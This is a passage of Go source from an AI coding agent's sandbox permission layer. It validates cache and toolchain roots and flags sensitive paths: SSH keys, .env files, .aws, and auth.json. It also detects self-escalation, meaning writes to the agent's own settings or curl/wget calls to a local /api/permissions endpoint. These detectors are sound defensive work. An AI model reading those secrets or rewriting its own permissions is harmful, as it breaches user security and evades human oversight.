// go tool: $GOMODCACHE, else $GOPATH/pkg/mod (GOPATH may be a list), else the
// default $HOME/go/pkg/mod.
func goModCacheRoots() []string {
	home, _ := os.UserHomeDir()
	if mc := strings.TrimSpace(os.Getenv("GOMODCACHE")); mc != "" {
		// Validate the override: a stray GOMODCACHE=/ or =$HOME must not
		// widen the boundary (falls back to GOPATH/default below instead).
		if isEnvCacheBaseValid(mc, home) {
			return []string{filepath.Clean(mc)}
		}
	}
	var roots []string
	if gp := strings.TrimSpace(os.Getenv("GOPATH")); gp != "" {
		for _, p := range filepath.SplitList(gp) {
			if p != "" && isEnvCacheBaseValid(p, home) {
				roots = append(roots, filepath.Join(p, "pkg", "mod"))
			}
		}
	}
	if len(roots) == 0 {
		if home, err := os.UserHomeDir(); err == nil {
			roots = append(roots, filepath.Join(home, "go", "pkg", "mod"))
		}
	}
	return roots
}

// languageDepRoots returns well-known global dependency cache and registry
// directories across languages. These are content-addressed or append-only
// stores that are safe for read-only access — listing or reading a cached
// dependency is benign and must not require a prompt.
func languageDepRoots() []string {
	seen := make(map[string]struct{})
	var roots []string
	add := func(p string) {
		if p == "" {
			return
		}
		if _, ok := seen[p]; ok {
			return
		}
		seen[p] = struct{}{}
		roots = append(roots, p)
	}

	// Go module cache (content-addressed, written 0444).
	for _, r := range goModCacheRoots() {
		add(r)
	}

	home, homeErr := os.UserHomeDir()
	if homeErr == nil {
		// npm content-addressable cache (respect npm_config_cache env var).
		if nc := strings.TrimSpace(os.Getenv("npm_config_cache")); nc != "" && isEnvCacheBaseValid(nc, home) {
			add(filepath.Clean(nc))
		} else if nc == "" {
			add(filepath.Join(home, ".npm", "_cacache"))
		}
		// pnpm store (immutable, content-addressed).
		add(filepath.Join(home, ".local", "share", "pnpm", "store"))
		add(filepath.Join(home, ".pnpm-store"))
		// yarn berry cache (immutable zip archives).
		if yc := strings.TrimSpace(os.Getenv("YARN_CACHE_FOLDER")); yc != "" && isEnvCacheBaseValid(yc, home) {
			add(filepath.Clean(yc))
		} else if yc == "" {
			add(filepath.Join(home, ".yarn", "berry", "cache"))
		}
		// Rust cargo registry (append-only, immutable packages).
		if ch := strings.TrimSpace(os.Getenv("CARGO_HOME")); ch != "" && isEnvCacheBaseValid(ch, home) {
			add(filepath.Join(ch, "registry"))
		} else if ch == "" {
			add(filepath.Join(home, ".cargo", "registry"))
		}
		// Python pip cache (content-addressed http cache).
		if pc := strings.TrimSpace(os.Getenv("PIP_CACHE_DIR")); pc != "" && isEnvCacheBaseValid(pc, home) {
			add(filepath.Clean(pc))
		} else if pc == "" {
			add(filepath.Join(home, ".cache", "pip"))
		}
		// Maven local repository.
		add(filepath.Join(home, ".m2", "repository"))
		// Gradle cache.
		if gh := strings.TrimSpace(os.Getenv("GRADLE_USER_HOME")); gh != "" && isEnvCacheBaseValid(gh, home) {
			add(filepath.Join(gh, "caches"))
		} else if gh == "" {
			add(filepath.Join(home, ".gradle", "caches"))
		}
	}

	// Go standard library (GOROOT). Respect the env var; fall back to common
	// install directories when it is unset (the standard binary distribution
	// installs to /usr/local/go, while some Linux distros use /usr/lib/go).
	if goroot := strings.TrimSpace(os.Getenv("GOROOT")); goroot != "" {
		add(goroot)
	} else {
		add("/usr/local/go") // Official binary distribution
		add("/usr/lib/go")   // Some Linux distributions (e.g. Debian golang-go package)
	}

	if homeErr == nil {
		// Ruby gem installation directories.
		if gemHome := strings.TrimSpace(os.Getenv("GEM_HOME")); gemHome != "" {
			if isEnvCacheBaseValid(gemHome, home) {
				add(filepath.Clean(gemHome))
			}
		}
		if gemPath := strings.TrimSpace(os.Getenv("GEM_PATH")); gemPath != "" {
			for _, p := range filepath.SplitList(gemPath) {
				if p != "" && isEnvCacheBaseValid(p, home) {
					add(filepath.Clean(p))
				}
			}
		}
		add(filepath.Join(home, ".gem"))

		// PHP Composer cache (respect COMPOSER_HOME, fall back to defaults).
		if ch := strings.TrimSpace(os.Getenv("COMPOSER_HOME")); ch != "" && isEnvCacheBaseValid(ch, home) {
			add(filepath.Join(ch, "cache"))
		} else if ch == "" {
			add(filepath.Join(home, ".cache", "composer"))
			add(filepath.Join(home, ".composer")) // Older default location
		}
	}

	// System Ruby gem paths (Linux/macOS common install directories).
	add("/usr/lib/ruby/gems")
	add("/usr/local/lib/ruby/gems")

	// Java JDK/JRE system paths.
	if javaHome := strings.TrimSpace(os.Getenv("JAVA_HOME")); javaHome != "" {
		add(javaHome)
	}
	add("/usr/lib/jvm")                      // Linux OpenJDK
	add("/Library/Java/JavaVirtualMachines") // macOS JDK

	// Python site-packages — system and user-installed library directories.
	// System paths use glob to match versioned subdirectories (python3.12, etc.)
	// without hardcoding a specific Python version.
	if libDirs, err := filepath.Glob("/usr/lib/python3.*/site-packages"); err == nil {
		for _, d := range libDirs {
			add(d)
		}
	}
	if libDirs, err := filepath.Glob("/usr/local/lib/python3.*/site-packages"); err == nil {
		for _, d := range libDirs {
			add(d)
		}
	}
	if homeErr == nil {
		// User site-packages (PEP 370): ~/.local/lib/pythonX.Y/site-packages.
		if libDirs, err := filepath.Glob(filepath.Join(home, ".local", "lib", "python3.*", "site-packages")); err == nil {
			for _, d := range libDirs {
				add(d)
			}
		}
		// pyenv-installed Python shims and versions.
		add(filepath.Join(home, ".pyenv", "versions"))
	}
	// macOS Homebrew Python on ARM Macs.
	if libDirs, err := filepath.Glob("/opt/homebrew/lib/python3.*/site-packages"); err == nil {
		for _, d := range libDirs {
			add(d)
		}
	}

	// XDG_CACHE_HOME-based paths for tools that respect the XDG spec.
	// The base is validated (a stray XDG=/ or =$HOME must not widen the
	// boundary); home is best-effort here since UserHomeDir may fail.
	if xdgCache := strings.TrimSpace(os.Getenv("XDG_CACHE_HOME")); xdgCache != "" {
		if home, herr := os.UserHomeDir(); herr == nil && isEnvCacheBaseValid(xdgCache, home) {
			add(filepath.Join(xdgCache, "pip"))
			add(filepath.Join(xdgCache, "npm", "_cacache"))
		}
	}

	sort.Strings(roots)
	return roots
}

// userWritableRoots returns user-owned writable roots for sandbox confinement:
// generic caches (whole ~/.cache per explicit user request + UserCacheDir),
// toolchain version managers (nvm/vite-plus/volta/fnm/rvm/rbenv/rustup/
// sdkman/jenv, conda env+pkg dirs, dotnet/mono, haskell, julia), their env
// overrides (validated: non-system + strictly under home), and binary install
// destinations (~/.local/bin, ~/bin, ~/.cargo/bin, ~/go/bin + validated
// GOBIN/GOPATH bins). Separated from languageDepRoots so isImmutableReadRoot
// does not broaden to whole ~/.cache.
func userWritableRoots() []string {
	seen := make(map[string]struct{})
	var roots []string
	add := func(p string) {
		if p == "" || p == "/" {
			return
		}
		clean := filepath.Clean(p)
		if clean == "/" || clean == "." {
			return
		}
		if _, ok := seen[clean]; ok {
			return
		}
		seen[clean] = struct{}{}
		roots = append(roots, clean)
	}
	home, homeErr := os.UserHomeDir()

	// addHomeEnv grants an env-provided dir only when it is a valid direct
	// root (absolute, non-system, strictly below home — never $HOME itself —
	// and canonical-path clean: a symlink escaping home is rejected).
	// Invalid values are ignored, never granted.
	addHomeEnv := func(key string) {
		v := strings.TrimSpace(os.Getenv(key))
		if v == "" {
			return
		}
		if clean, ok := validatedHomeRoot(v, home); ok {
			add(clean)
		}
	}
	// addHomeEnvOrDefault grants the validated env dir, or the home-joined
	// default when the env var is unset (mirrors the CARGO_HOME pattern: a
	// set-but-invalid value grants nothing, not even the default).
	addHomeEnvOrDefault := func(key, def string) {
		if strings.TrimSpace(os.Getenv(key)) != "" {
			addHomeEnv(key)
			return
		}
		add(def)
	}
	// addHomeList grants each entry of a list env var (filepath.SplitList)
	// under the same direct-root + canonical-path validation.
	addHomeList := func(key string) {
		for _, p := range filepath.SplitList(strings.TrimSpace(os.Getenv(key))) {
			if p == "" {
				continue
			}
			if clean, ok := validatedHomeRoot(p, home); ok {
				add(clean)
			}
		}
	}

	// Generic cache roots — cross-platform.
	// os.UserCacheDir is canonical: darwin ~/Library/Caches, linux ~/.cache, windows %LOCALAPPDATA%.
	// On Linux it echoes XDG_CACHE_HOME verbatim, so an unvalidated add here
	// would let XDG_CACHE_HOME=$HOME (or /tmp/evil) bypass the boundary check
	// below. When the returned dir is the env value, validate it as a direct
	// root instead of trusting it.
	xdgCache := strings.TrimSpace(os.Getenv("XDG_CACHE_HOME"))
	if cacheDir, err := os.UserCacheDir(); err == nil && cacheDir != "" && cacheDir != "/" {
		clean := filepath.Clean(cacheDir)
		if xdgCache != "" && clean == filepath.Clean(xdgCache) {
			if homeErr == nil {
				if canonical, ok := validatedHomeRoot(clean, home); ok {
					add(canonical)
				}
			}
		} else if !isSystemRoot(clean) {
			add(clean)
		}
	}
	if xdgCache != "" {
		// XDG dir not echoed by UserCacheDir (darwin): grant when valid.
		// Strict direct-root validation: XDG_CACHE_HOME=$HOME must not grant
		// the entire home directory (needs home, so skipped when homeless).
		// Re-adding an already-covered dir is a harmless dedup no-op.
		if homeErr == nil {
			if clean, ok := validatedHomeRoot(xdgCache, home); ok {
				add(clean)
			}
		}
	} else if homeErr == nil {
		// Explicit /Users/james/.cache coverage when XDG_CACHE_HOME is unset —
		// on macOS UserCacheDir is ~/Library/Caches, so ~/.cache would otherwise be missing.
		// Whole ~/.cache is broader than targeted subdirs (browser/app caches) — intentional
		// tradeoff per user requirement.
		add(filepath.Join(home, ".cache"))
	}
	if homeErr == nil && runtime.GOOS == "darwin" {
		add(filepath.Join(home, "Library", "Caches"))
	}
	if homeErr == nil {
		// Targeted subdirs for tool caches that may live outside UserCacheDir.
		// Skipped when whole ~/.cache is already writable: the parent subpath
		// rule covers them, so emitting child rules only bloats the profile
		// and risks a missing-dir failure (e.g. ~/.cache/bun not yet created).
		dotCache := filepath.Clean(filepath.Join(home, ".cache"))
		if _, covered := seen[dotCache]; !covered {
			add(filepath.Join(home, ".cache", "go-build"))
			add(filepath.Join(home, ".cache", "uv"))
			add(filepath.Join(home, ".cache", "bun"))
			add(filepath.Join(home, ".cache", "yarn"))
		}
	}

	// User-owned binary install destinations — writable for `go install` / `cargo install`.
	if homeErr == nil {
		add(filepath.Join(home, ".local", "bin"))
		add(filepath.Join(home, "bin"))
		// Cargo bin — respect CARGO_HOME, but require home containment or non-system path.
		if ch := strings.TrimSpace(os.Getenv("CARGO_HOME")); ch != "" {
			clean := filepath.Clean(ch)
			if clean != "/" && !isSystemRoot(clean) && isUnderHomeStrict(clean, home) {
				add(filepath.Join(clean, "bin"))
			}
		} else {
			add(filepath.Join(home, ".cargo", "bin"))
		}
		// Go bin — GOBIN takes precedence; otherwise GOPATH/bin + ~/go/bin.
		// GOBIN is granted as-is, so it uses strict direct-root validation:
		// GOBIN=$HOME must not make the entire home directory writable
		// (GOPATH entries below only ever grant their bin/ child).
		if gobin := strings.TrimSpace(os.Getenv("GOBIN")); gobin != "" {
			if clean, ok := validatedHomeRoot(gobin, home); ok {
				add(clean)
			}
		} else if gp := strings.TrimSpace(os.Getenv("GOPATH")); gp != "" {
			for _, p := range filepath.SplitList(gp) {
				if p == "" {
					continue
				}
				clean := filepath.Clean(p)
				if clean == "/" || isSystemRoot(clean) || !isUnderHomeStrict(clean, home) {
					continue
				}
				add(filepath.Join(clean, "bin"))
			}
			add(filepath.Join(home, "go", "bin"))
		} else {
			add(filepath.Join(home, "go", "bin"))
		}
		// Go build cache override — the default (~/.cache/go-build) is already
		// covered by the whole-~/.cache rule above.
		addHomeEnv("GOCACHE")

		// Node.js version managers and runtimes — toolchains install outside
		// the cache dirs, so `nvm install` / `volta install` / `fnm install`
		// and bun/deno/pnpm setup fail under sandbox without explicit roots.
		addHomeEnvOrDefault("NVM_DIR", filepath.Join(home, ".nvm"))
		// Vite+ toolchain manager — owns node versions, shims, and caches
		// (bins/, current, cache/) outside the cache dirs. Newer layouts use
		// the XDG data dir; VP_HOME relocates the whole manager and the
		// VP_*_DIR vars relocate individual dirs (all validated home-contained).
		if strings.TrimSpace(os.Getenv("VP_HOME")) != "" {
			addHomeEnv("VP_HOME")
		} else {
			add(filepath.Join(home, ".vite-plus"))
			add(filepath.Join(home, ".local", "share", "vite-plus"))
		}
		addHomeEnv("VP_BIN_DIR")
		addHomeEnv("VP_DATA_DIR")
		addHomeEnv("VP_CACHE_DIR")
		addHomeEnvOrDefault("BUN_INSTALL", filepath.Join(home, ".bun"))
		addHomeEnvOrDefault("DENO_INSTALL", filepath.Join(home, ".deno"))
		addHomeEnv("DENO_DIR")
		addHomeEnvOrDefault("VOLTA_HOME", filepath.Join(home, ".volta"))
		addHomeEnvOrDefault("FNM_DIR", filepath.Join(home, ".fnm"))
		if strings.TrimSpace(os.Getenv("PNPM_HOME")) != "" {
			addHomeEnv("PNPM_HOME")
		} else if runtime.GOOS == "darwin" {
			add(filepath.Join(home, "Library", "pnpm"))
		} else {
			add(filepath.Join(home, ".local", "share", "pnpm"))
		}
		// uv cache default lives under ~/.cache (covered above); managed
		// Pythons default outside it — honor overrides or platform defaults.
		addHomeEnv("UV_CACHE_DIR")
		if strings.TrimSpace(os.Getenv("UV_PYTHON_INSTALL_DIR")) != "" {
			addHomeEnv("UV_PYTHON_INSTALL_DIR")
		} else if runtime.GOOS == "darwin" {
			add(filepath.Join(home, "Library", "Application Support", "uv", "python"))
		} else {
			add(filepath.Join(home, ".local", "share", "uv", "python"))
		}

		// Ruby version managers — rubies, gemsets, and shims live under home.
		addHomeEnvOrDefault("rvm_path", filepath.Join(home, ".rvm"))
		addHomeEnvOrDefault("RBENV_ROOT", filepath.Join(home, ".rbenv"))
		addHomeEnvOrDefault("JENV_ROOT", filepath.Join(home, ".jenv"))

		// Rust toolchain manager — `rustup update` writes toolchains outside
		// the cargo registry/bin roots covered above.
		addHomeEnvOrDefault("RUSTUP_HOME", filepath.Join(home, ".rustup"))

		// Conda — environment + package caches plus the active prefix.
		// Install roots (~/miniconda3 etc.) are deliberately NOT added: they
		// bundle interpreters and packages, and envs belong in CONDA_ENVS_PATH.
		add(filepath.Join(home, ".conda"))
		addHomeList("CONDA_ENVS_PATH")
		addHomeList("CONDA_PKGS_DIRS")
		addHomeEnv("CONDA_PREFIX")

		// npm — whole ~/.npm (languageDepRoots covers only _cacache; npx's
		// _npx and _logs live alongside it and stay denied without the parent).
		add(filepath.Join(home, ".npm"))

		// .NET / Mono — NuGet global packages, dotnet CLI home, mono registry.
		// The system Mono framework stays read-only (sdk installs need
		// elevation and are out of sandbox scope).
		addHomeEnvOrDefault("NUGET_PACKAGES", filepath.Join(home, ".nuget", "packages"))
		addHomeEnvOrDefault("DOTNET_CLI_HOME", filepath.Join(home, ".dotnet"))
		addHomeEnv("DOTNET_ROOT")
		add(filepath.Join(home, ".mono"))

		// JVM — sdkman (JDK/Gradle/Maven versions), sbt/ivy/coursier state,
		// whole ~/.m2 (settings.xml + wrapper dists alongside the repository
		// covered in languageDepRoots) and whole gradle home (daemons/logs
		// alongside caches).
		addHomeEnvOrDefault("SDKMAN_DIR", filepath.Join(home, ".sdkman"))
		add(filepath.Join(home, ".sbt"))
		add(filepath.Join(home, ".ivy2"))
		add(filepath.Join(home, ".coursier"))
		add(filepath.Join(home, ".m2"))
		if strings.TrimSpace(os.Getenv("GRADLE_USER_HOME")) != "" {
			addHomeEnv("GRADLE_USER_HOME")
		} else {
			add(filepath.Join(home, ".gradle"))
		}
		addHomeEnv("COURSIER_CACHE")

		// Python — broaden pyenv to the whole root (shims/ rehash + download
		// cache, not just versions/), pipenv/virtualenvwrapper homes, poetry.
		add(filepath.Join(home, ".pyenv"))
		if strings.TrimSpace(os.Getenv("WORKON_HOME")) != "" {
			addHomeEnv("WORKON_HOME")
		} else {
			add(filepath.Join(home, ".local", "share", "virtualenvs"))
			add(filepath.Join(home, ".virtualenvs"))
		}
		if strings.TrimSpace(os.Getenv("POETRY_HOME")) != "" {
			addHomeEnv("POETRY_HOME")
		} else if runtime.GOOS == "darwin" {
			add(filepath.Join(home, "Library", "Application Support", "pypoetry"))
		} else {
			add(filepath.Join(home, ".local", "share", "pypoetry"))
		}

		// Julia depot (packages + environments), Terraform plugin cache,
		// Haskell toolchains.
		if strings.TrimSpace(os.Getenv("JULIA_DEPOT_PATH")) != "" {
			addHomeList("JULIA_DEPOT_PATH")
		} else {
			add(filepath.Join(home, ".julia"))
		}
		addHomeEnv("TF_PLUGIN_CACHE_DIR")
		add(filepath.Join(home, ".terraform.d"))
		add(filepath.Join(home, ".ghcup"))
		add(filepath.Join(home, ".cabal"))
		add(filepath.Join(home, ".stack"))

		// Mobile / misc ecosystems — Android SDK, Dart pub cache, pipx venvs,
		// npm global prefix, R libs, Elixir hex/mix, asdf/mise shims.
		if strings.TrimSpace(os.Getenv("ANDROID_HOME")) != "" {
			addHomeEnv("ANDROID_HOME")
		} else if runtime.GOOS == "darwin" {
			add(filepath.Join(home, "Library", "Android", "sdk"))
		} else {
			add(filepath.Join(home, "Android", "Sdk"))
		}
		addHomeEnvOrDefault("PUB_CACHE", filepath.Join(home, ".pub-cache"))
		addHomeEnvOrDefault("PIPX_HOME", filepath.Join(home, ".local", "share", "pipx"))
		addHomeEnvOrDefault("NPM_CONFIG_PREFIX", filepath.Join(home, ".npm-global"))
		addHomeList("R_LIBS")
		addHomeList("R_LIBS_USER")
		addHomeEnvOrDefault("MIX_HOME", filepath.Join(home, ".mix"))
		addHomeEnvOrDefault("HEX_HOME", filepath.Join(home, ".hex"))
		addHomeEnvOrDefault("ASDF_DIR", filepath.Join(home, ".asdf"))
		addHomeEnvOrDefault("MISE_DATA_DIR", filepath.Join(home, ".local", "share", "mise"))
	}

	sort.Strings(roots)
	return roots
}

func isSystemRoot(p string) bool {
	clean := filepath.Clean(p)
	if clean == "/usr" || clean == "/opt" || clean == "/System" || clean == "/Library" {
		return true
	}
	if strings.HasPrefix(clean, "/usr/") || strings.HasPrefix(clean, "/opt/") {
		return true
	}
	if strings.HasPrefix(clean, "/System/") || strings.HasPrefix(clean, "/Library/") {
		return true
	}
	// Windows system roots are not relevant here; isSystemRoot is Unix-focused.
	return false
}

func isUnderHomeStrict(p, home string) bool {
	if p == home {
		return true
	}
	return pathUnderRoot(p, home)
}

// isDirectEnvRootValid reports whether an env-provided dir may be granted as a
// writable root as-is: absolute, non-system, neither / nor $HOME itself, and
// strictly below $HOME. Equal-to-home (or parent/relative) values are rejected
// so a stray GOBIN=$HOME or XDG_CACHE_HOME=$HOME cannot make the entire home
// directory writable. Callers that append a safe child (e.g. $CARGO_HOME/bin,
// $GOPATH/bin) keep using isUnderHomeStrict, where equal-home only grants the
// child.
func isDirectEnvRootValid(p, home string) bool {
	if p == "" || !filepath.IsAbs(p) {
		return false
	}
	clean := filepath.Clean(p)
	if clean == "/" || clean == filepath.Clean(home) || isSystemRoot(clean) {
		return false
	}
	return pathUnderRoot(clean, home)
}

// validatedHomeRoot enforces the canonical-path policy for env-provided
// roots: a path lexically under $HOME that is a symlink to /tmp (or anywhere
// outside home) must not be granted. When the path exists, the symlink-resolved
// canonical path must itself pass direct-root validation, and the canonical
// path is what gets granted; when it does not exist yet there is nothing to
// escape through, so the lexical path is granted (a missing dir is skipped by
// the sandbox backends until created).
func validatedHomeRoot(p, home string) (string, bool) {
	clean := filepath.Clean(p)
	if !isDirectEnvRootValid(clean, home) {
		return "", false
	}
	canonical, err := filepath.EvalSymlinks(clean)
	if err != nil {
		return clean, true
	}
	homeCanonical, herr := filepath.EvalSymlinks(home)
	if herr != nil {
		homeCanonical = home
	}
	if !isDirectEnvRootValid(canonical, homeCanonical) {
		return "", false
	}
	return canonical, true
}

// isEnvCacheBaseValid validates env-provided language-cache bases
// (npm/pip/yarn/cargo/gradle/composer/gem overrides): absolute, not the
// filesystem root, not $HOME itself, and outside system dirs. Unlike direct
// tool roots it may live outside $HOME (CI caches on scratch volumes such as
// PIP_CACHE_DIR=/tmp/pip stay usable), yet a stray =/ or =$HOME value must
// never widen the boundary to the whole disk or home.
func isEnvCacheBaseValid(p, home string) bool {
	if p == "" || !filepath.IsAbs(p) {
		return false
	}
	clean := filepath.Clean(p)
	if clean == "/" || clean == filepath.Clean(home) || isSystemRoot(clean) {
		return false
	}
	return true
}

// isImmutableReadRoot reports whether rawPath lies within a known read-only,
// developer-trusted root (currently the Go module cache and other language
// dependency caches). Used to auto-allow read-only tools out-of-scope without
// consulting the permission model — listing or reading a cached dependency is
// benign and must not require a prompt.
func isImmutableReadRoot(rawPath string) bool {
	absPath, err := filepath.Abs(rawPath)
	if err != nil {
		return false
	}
	clean := filepath.Clean(absPath)
	for _, root := range languageDepRoots() {
		if pathUnderRoot(clean, filepath.Clean(root)) {
			return true
		}
	}
	return false
}

// allArgsAreTempDirs checks if all arguments in a bash command that look like
// absolute file paths are within temp directories. This allows commands like "ls /tmp"
// or "cat /tmp/foo.txt" to be auto-allowed.
func allArgsAreTempDirs(cmdWords []string) bool {
	if len(cmdWords) < 2 {
		return false
	}
	hasPathArg := false
	// Skip the command itself (first word)
	for _, arg := range cmdWords[1:] {
		// Skip flags (start with -)
		if strings.HasPrefix(arg, "-") {
			continue
		}
		// Skip output redirections (handled separately)
		if arg == ">" || arg == ">>" || arg == "1>" || arg == "2>" {
			continue
		}
		// Only check absolute paths (must start with /)
		if strings.HasPrefix(arg, "/") {
			hasPathArg = true
			if !isTempDir(arg) {
				return false
			}
		}
	}
	// Only allow if there was at least one absolute path arg and all were temp dirs
	return hasPathArg
}

func isSensitivePath(path string) bool {
	clean := filepath.ToSlash(filepath.Clean(path))
	base := filepath.Base(clean)

	// Exact match sensitive filenames
	sensitiveBases := []string{".env", ".netrc", ".npmrc", ".pypirc"}
	for _, s := range sensitiveBases {
		if base == s {
			return true
		}
	}

	// .env.* variants — only flag files that typically carry actual secrets.
	// Safe template/sample files that are committed to git and contain only
	// dummy values are excluded.
	if strings.HasPrefix(base, ".env.") {
		safeVariants := []string{".env.example", ".env.sample", ".env.template", ".env.dist"}
		for _, safe := range safeVariants {
			if base == safe {
				return false
			}
		}
		return true
	}

	// SSH keys
	sshKeyBases := []string{"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"}
	for _, k := range sshKeyBases {
		if base == k {
			return true
		}
	}

	// Certificate/key files
	certSuffixes := []string{".pem", ".key", ".p12", ".pfx", ".secrets"}
	for _, suffix := range certSuffixes {
		if strings.HasSuffix(base, suffix) {
			return true
		}
	}

	// Paths under sensitive directories
	sensitiveDirs := []string{".git/", ".github/workflows/", ".aws/"}
	for _, dir := range sensitiveDirs {
		if strings.Contains("/"+clean+"/", "/"+dir) || strings.HasPrefix(clean, dir) {
			return true
		}
	}

	return false
}

// sensitiveSandboxDecision implements the sandbox-mode sensitive-set carve-out
// (INDEX Decision 3): in sandbox mode the YOLO-style auto-allow does NOT extend
// to the sensitive set. It returns an ASK decision (routed to the auto-
// permission judge when auto is on, else a human prompt — sandbox never
// disables auto, Decision 9) when the command statically touches:
//
//   - ocode's auth.json (read or write) — the agent never legitimately needs it
//   - ocode's global config dir or data dir (WRITE only) — guards the agent
//     silently self-granting a permission rule by rewriting its own config
//   - ~/.ssh and .env files (read or write)
//
// It returns nil when no sensitive target is statically found, letting the
// caller auto-allow. Static extraction can't see a read hidden inside an
// interpreter (`python -c`); that residual is documented (Part 04). The OS
// write-wall does not protect this set (auth.json/ssh are globally readable,
// config/.env sit in writable roots), so the permission layer is the gate.
func (pm *PermissionManager) sensitiveSandboxDecision(command string) *PermissionDecision {
	// Only meaningful in sandbox mode; never applies in normal/yolo/locked.
	if pm.mode != PermissionModeSandbox {
		return nil
	}

	targets, isWrite := sandboxSensitiveTargets(command, pm.workDir)
	if len(targets) == 0 {
		return nil
	}
	for _, tgt := range targets {
		if sandboxSensitivePath(tgt, isWrite) {
			pm.emitDebug("perm", fmt.Sprintf("sandbox sensitive ASK: command=%q", command))
			return &PermissionDecision{
				Level:   PermissionAsk,
				Request: bashPermissionRequest(nil, command, "sandbox.sensitive"),
			}
		}
	}
	return nil
}

// sandboxSensitiveTargets returns the absolute, resolved target paths a command
// statically touches (path args + redirect targets) and whether the command is
// a write-oriented operation. It mirrors the extractBashCommandPaths /
// parseShellCommandLine redirection logic so the carve-out catches the common
// read/write forms the matrix calls out (cat, redirect, tee, cp, editor).
func sandboxSensitiveTargets(command, workDir string) (paths []string, write bool) {
	set := map[string]struct{}{}
	add := func(p string) {
		if p == "" || isAllowedDevicePath(p) {
			return
		}
		r := resolvePath(p, workDir)
		if _, ok := set[r]; !ok {
			set[r] = struct{}{}
			paths = append(paths, r)
		}
	}

	parsed, err := parseShellCommandLine(command)
	if err == nil {
		for _, cmd := range parsed {
			if len(cmd.redirections) > 0 {
				write = true // a redirection target is a write (or read) target
			}
			for _, r := range cmd.redirections {
				add(r)
			}
		}
	}
	fields := splitShellFields(command)
	if len(fields) > 0 {
		for _, p := range extractBashCommandPaths(fields[0], fields) {
			add(p)
		}
	}
	return paths, write
}

// sandboxSensitivePath classifies a resolved path against the sandbox sensitive
// set. isWrite distinguishes write-only entries (config/data dirs) from
// read-or-write entries (auth.json, ~/.ssh, .env).
func sandboxSensitivePath(resolved string, write bool) bool {
	if resolved == "" {
		return false
	}
	clean := filepath.Clean(resolved)

	// ocode's global config/data dirs: write-only for the self-escalation guard.
	// (data dir holds auth.json, which is additionally covered by the auth.json
	// rule below; config dir writes guard self-granting a permission rule.)
	if write {
		if cfgDir, err := paths.GlobalConfigDir(); err == nil && pathUnderRoot(clean, cfgDir) {
			return true
		}
		if dataDir, err := paths.GlobalDataDir(); err == nil && pathUnderRoot(clean, dataDir) {
			return true
		}
	}

	// auth.json, wherever it lives (always read-or-write).
	if base := filepath.Base(clean); base == "auth.json" {
		return true
	}

	// ~/.ssh reads or writes.
	if home, err := os.UserHomeDir(); err == nil {
		if sshRoot := filepath.Join(home, ".ssh"); pathUnderRoot(clean, sshRoot) {
			return true
		}
	}

	// .env files (isSensitivePath already flags them; reuse for parity).
	if isSensitivePath(clean) {
		return true
	}
	return false
}

// isPermissionEscalation reports whether a bash command could silently widen
// the agent's own permissions and must therefore never auto-allow in ANY mode
// (INDEX Decision 8; wired above the YOLO/sandbox shortcuts in Decide). It
// returns true when the command WRITES to a permission-defining target
// (project/.ocode/settings.json, .claude/settings.json, ocode global config
// permissions, allowlist/config files feeding extra_allowed_paths / allow-
// deny rules) or makes a loopback request to the local /api/permissions* API
// (which would flip the mode/rules directly).
//
// Static only: a write hidden inside an interpreter (`python -c`) is a
// documented residual (Part 04) — the OS write-wall can't stop it either since
// the file lives in a writable root, so config edits belong outside sandbox.
func (pm *PermissionManager) isPermissionEscalation(command string) bool {
	return pm.escalationWriteTarget(command, pm.workDir) || permissionApiLoopback(command)
}

// escalationWriteTarget reports whether the command writes to any
// permission-defining target. It reuses the redirection + path-arg extraction
// so the common write forms (redirect, tee, cp, editor) are caught.
func (pm *PermissionManager) escalationWriteTarget(command, workDir string) bool {
	parseTarget := command
	if header, _ := extractHeredocs(command); len(header) > 0 {
		parseTarget = header
	}
	parsed, err := parseShellCommandLine(parseTarget)
	if err != nil {
		return false
	}
	for _, cmd := range parsed {
		// A write must be present: redirection target(s) mean a write.
		if len(cmd.redirections) == 0 {
			continue
		}
		for _, r := range cmd.redirections {
			if isAllowedDevicePath(r) {
				continue
			}
			resolved := resolvePath(r, workDir)
			if isPermissionConfigTarget(resolved) {
				return true
			}
		}
	}
	// Additionally check path-arg tools that write: cp/touch/mv/install,
	// tee, and source editors target a file as a positional argument.
	fields := splitShellFields(parseTarget)
	if len(fields) > 0 {
		switch fields[0] {
		case "cp", "mv", "touch", "install", "vim", "vi", "nano", "sed", "ed", "tee":
			for _, p := range extractBashCommandPaths(fields[0], fields) {
				if isPermissionConfigTarget(resolvePath(p, workDir)) {
					return true
				}
			}
		}
	}
	return false
}

// isPermissionConfigTarget reports whether a resolved path is a permission-
// defining target the agent must not silently rewrite.
func isPermissionConfigTarget(resolved string) bool {
	if resolved == "" {
		return false
	}
	base := filepath.Base(resolved)
	dirBase := filepath.Base(filepath.Dir(resolved))

	// Project .ocode/settings.json and .claude/settings.json (anywhere in tree).
	if base == "settings.json" && (dirBase == ".ocode" || dirBase == ".claude") {
		return true
	}
	// ocode global config files (config dir) that gate permissions/allowlist.
	if cfgDir, err := paths.GlobalConfigDir(); err == nil && pathUnderRoot(resolved, cfgDir) {
		switch base {
		case "ocodeconfig.json", "opencode.json", "autopermission-prompt.md", "smartpermission-prompt.md":
			return true
		}
	}
	// .claude/settings.json anywhere is a deny-rule source.
	if filepath.Clean(resolved) != "" && base == "settings.json" && dirBase == ".claude" {
		return true
	}
	return false
}

// permissionApiLoopback reports whether a network command targets the local
// /api/permissions* API — the agent could flip its own mode or rules here.
func permissionApiLoopback(command string) bool {
	fields := splitShellFields(command)
	if len(fields) < 2 {
		return false
	}
	switch fields[0] {
	case "curl", "wget", "http", "https":
	default:
		return false
	}
	for _, tok := range fields[1:] {
		t := strings.Trim(tok, `'"`)
		if !strings.Contains(t, "/api/permissions") {
			continue
		}
		// Loopback host requirement: the URL's host must be localhost/127.x.
		if isLocalhostURL(t) {
			return true
		}
	}
	return false
}

// isLocalhostURL reports whether an http(s) URL host is loopback (localhost,
// 127.0.0.0/8, ::1). Used for the permission-API self-escalation check: a
// request to a *remote* /api/permissions is not our server and is harmless.
func isLocalhostURL(raw string) bool {
	host := raw
	if at := strings.Index(host, "://"); at >= 0 {
		host = host[at+3:]
	}
	if slash := strings.IndexByte(host, '/'); slash >= 0 {
		host = host[:slash]
	}
	// Strip port.
	if colon := strings.LastIndexByte(host, ':'); colon >= 0 && !strings.Contains(host[:colon], "]") {
		host = host[:colon]
	}
	return isLocalhostDomain(host)
}

func extractPathFromArgs(toolName string, args json.RawMessage) string {
	var params struct {
		Path     string `json:"path"`
		FilePath string `json:"file_path"`
		Pattern  string `json:"pattern"`
